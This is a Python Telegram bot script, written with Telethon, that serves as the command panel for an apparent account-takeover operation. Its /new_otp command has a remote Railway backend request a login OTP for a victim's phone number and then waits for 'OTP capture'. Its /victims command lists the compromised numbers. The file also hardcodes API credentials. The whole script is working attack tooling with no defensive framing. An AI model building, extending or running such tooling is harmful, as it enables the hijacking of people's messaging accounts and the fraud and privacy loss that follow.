from telethon import TelegramClient, events
import os
import asyncio
import requests
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Config
API_ID = 24289127
API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
BOT_TOKEN = os.environ.get('BOT_TOKEN')
RAILWAY_URL = 'https://siluman-cancut-production.up.railway.app'

# Bot client
bot = TelegramClient('working_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Store untuk track processed messages
processed_messages = set()

@bot.on(events.NewMessage)
async def handle_message(event):
    try:
        message_id = event.message.id
        if message_id in processed_messages:
            return
        processed_messages.add(message_id)
        
        text = event.message.text
        user_id = event.sender_id
        
        print(f"📨 Received: '{text}' from {user_id}")
        
        # Handle commands
        if text.startswith('/start'):
            await event.reply(
                "🤖 **JINX BOT WORKING!** 😈\n\n"
                "Commands:\n"
                "• `/new_otp +62xxx` - Request OTP\n"
                "• `/victims` - List victims\n"
                "• `/status` - Bot status\n\n"
                "💀 **SYSTEM ACTIVE**"
            )
            
        elif text.startswith('/new_otp'):
            parts = text.split()
            if len(parts) == 2 and parts[1].startswith('+'):
                phone = parts[1]
                await event.reply(f"🔄 Requesting OTP for `{phone}`...")
                
                try:
                    response = requests.get(f"{RAILWAY_URL}/get_new_otp?phone={phone}", timeout=30)
                    if response.status_code == 200:
                        data = response.json()
                        if data.get('success'):
                            await event.reply(
                                f"✅ **OTP REQUESTED!** 😈\n\n"
                                f"📱 `{phone}`\n"
                                f"🔑 Hash: `{data['phone_code_hash']}`\n\n"
                                f"💀 Wait for OTP capture!"
                            )
                        else:
                            await event.reply(f"❌ Failed: `{data.get('error')}`")
                    else:
                        await event.reply("❌ API Error")
                except Exception as e:
                    await event.reply(f"💀 Error: `{str(e)}`")
            else:
                await event.reply("❌ Format: `/new_otp +628123456789`")
                
        elif text.startswith('/victims'):
            try:
                response = requests.get(f"{RAILWAY_URL}/victims", timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    victims = data.get('victims', [])
                    if victims:
                        victim_list = "\n".join([f"• `{v}`" for v in victims[:10]])
                        await event.reply(
                            f"🎯 **VICTIMS** ({len(victims)})\n\n{victim_list}"
                        )
                    else:
                        await event.reply("❌ No victims found")
                else:
                    await event.reply("❌ Failed to get victims")
            except Exception as e:
                await event.reply(f"💀 Error: `{str(e)}`")
                
        elif text.startswith('/status'):
            await event.reply(
                "🤖 **BOT STATUS** 😈\n\n"
                "✅ **ONLINE**\n"
                "✅ **COMMANDS WORKING**\n"
                "✅ **READY FOR ACTION**\n\n"
                "💀 Use `/new_otp +62xxx` to test"
            )
            
        else:
            await event.reply("❌ Unknown command. Use `/start` for help")
            
    except Exception as e:
        print(f"💀 Error in handler: {e}")
        try:
            await event.reply("💀 System error occurred")
        except:
            pass

print("🚀 Starting WORKING BOT...")
bot.run_until_disconnected()
